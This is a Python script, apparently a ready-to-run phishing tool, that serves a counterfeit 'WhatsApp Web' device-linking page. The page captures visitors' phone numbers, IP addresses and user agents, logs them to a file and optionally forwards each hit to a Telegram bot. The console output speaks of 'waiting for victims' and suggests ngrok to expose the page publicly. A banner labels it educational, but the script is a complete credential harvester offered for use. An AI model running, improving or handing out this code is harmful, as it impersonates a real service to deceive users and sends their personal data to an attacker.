#!/usr/bin/env python3
import os
import sys
import time
import socket
import requests
from datetime import datetime
from threading import Thread
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

# ============= CONFIGURATION =============
LOG_FILE = "whatsapp_creds.log"
TELEGRAM_BOT_TOKEN = ""  # Optional: Your Telegram bot token
TELEGRAM_CHAT_ID = ""    # Optional: Your chat ID for alerts
USE_TELEGRAM = bool(TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID)
# =========================================

def send_telegram_alert(message):
    if not USE_TELEGRAM:
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
        requests.post(url, data=payload, timeout=5)
    except:
        pass

class FakeWhatsAppHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            html = """
            <html lang="en">
            <head>
                <meta charset="UTF-8" />
                <title>WhatsApp Web</title>
                <style>
                    body { font-family: Arial; text-align: center; padding: 50px; }
                    .container { max-width: 400px; margin: 0 auto; }
                    img { width: 80px; margin-bottom: 20px; }
                    input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; }
                    button { background: #25D366; color: white; border: none; padding: 10px; width: 100%; cursor: pointer; }
                </style>
            </head>
            <body>
                <div class="container">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
                    <h2>Link Your Device</h2>
                    <p>Scan the QR code below with your phone</p>
                    <div style="border:2px dashed #aaa; padding:20px; margin:20px 0;">
                        🔳 QR Code Placeholder - Real attack would inject dynamic QR
                    </div>
                    <p>Or enter your phone number manually:</p>
                    <input type="tel" name="phone" placeholder="+1 234 567 8900" id="phone"/>
                    <button onclick="fakeLogin()">Link Device</button>
                    <script>
                        function fakeLogin() {
                            const num = document.getElementById('phone').value;
                            fetch('/login', {
                                method: 'POST',
                                body: 'phone=' + encodeURIComponent(num),
                                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                            });
                            alert("Device linked successfully! Keep WhatsApp open.");
                        }
                    </script>
                </div>
            </body>
            </html>
            """
            self.wfile.write(html.encode())
        else:
            self.send_error(404)

    def do_POST(self):
        if self.path == '/login':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            parsed_data = urllib.parse.parse_qs(post_data)
            phone = parsed_data.get('phone', [''])[0]

            # Log stolen data
            ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            log_entry = f"""
[!] Captured Credential Attempt
Time: {timestamp}
IP: {ip}
Phone: {phone}
User-Agent: {user_agent}
{"-"*50}
"""
            print(log_entry.strip())
            with open(LOG_FILE, "a") as f:
                f.write(log_entry)

            # Send alert
            alert_msg = f"🎯 WA PHISH HIT!\nIP: {ip}\nPhone: {phone}\nUA: {user_agent}"
            Thread(target=send_telegram_alert, args=(alert_msg,), daemon=True).start()

            # Response
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<h3>Your device will sync shortly...</h3><p>This is a simulation. No real access gained.</p>")
        else:
            self.send_error(404)

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def run_server(port=8080):
    server = HTTPServer(('0.0.0.0', port), FakeWhatsAppHandler)
    print(f"\n🌐 Server running on http://0.0.0.0:{port}")
    local_ip = get_local_ip()
    print(f"🔗 Share this URL: http://{local_ip}:{port}  (Use ngrok for public access)")
    print("\n⏳ Waiting for victims... (Press Ctrl+C to stop)\n")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n\n🛑 Server stopped.")
        sys.exit(0)

def show_banner():
    banner = """
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

╔══════════════════════════════════════╗
║  WhatsApp Fake Account Info Harvester  ║
║     Developed by: Mr Sabaz Ali Khan    ║
║   WARNING: FOR EDUCATIONAL PURPOSES    ║
╚══════════════════════════════════════╝
    """
    print(banner)

if __name__ == "__main__":
    show_banner()
    print("\n🚀 Starting malicious server...\n")
    if len(sys.argv) > 1 and sys.argv[1].isdigit():
        port = int(sys.argv[1])
    else:
        port = 8080
    run_server(port)